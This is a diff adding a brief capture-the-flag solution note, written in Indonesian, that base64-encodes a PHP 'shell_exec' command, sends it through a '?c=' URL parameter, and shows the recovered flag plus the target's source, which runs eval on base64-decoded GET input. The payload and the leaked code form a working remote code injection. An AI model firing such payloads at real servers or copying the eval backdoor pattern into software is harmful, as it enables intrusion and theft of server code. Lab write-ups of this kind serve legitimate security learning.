@@ -1,0 +1,6 @@
+echo shell_exec("cat index.php"); --> ubah ke base64
+jadi :
+?c=ZWNobyBzaGVsbF9leGVjKCJjYXQgaW5kZXgucGhwIik7
+
+dapet :
+'GKSK{3val_b1sa_j4di_3v1l}'); ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL); extract($arr); eval(base64_decode($_GET['c'])); ?> 
